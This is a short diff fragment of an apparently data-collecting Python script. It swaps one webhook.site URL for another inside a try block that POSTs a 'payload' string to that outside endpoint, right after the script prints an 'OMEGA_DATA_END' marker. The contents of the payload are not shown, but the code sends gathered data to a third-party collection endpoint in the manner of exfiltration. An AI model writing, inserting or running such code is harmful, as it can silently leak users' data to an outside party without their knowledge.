@@ -63,7 +63,7 @@ print("OMEGA_DATA_END")
 print("!"*30 + "\n")
 
 try:
-    url = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"
+    url = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"
     data = payload.encode('utf-8')
     req = urllib.request.Request(url, data=data, method="POST")
     req.add_header("Content-Type", "text/plain")
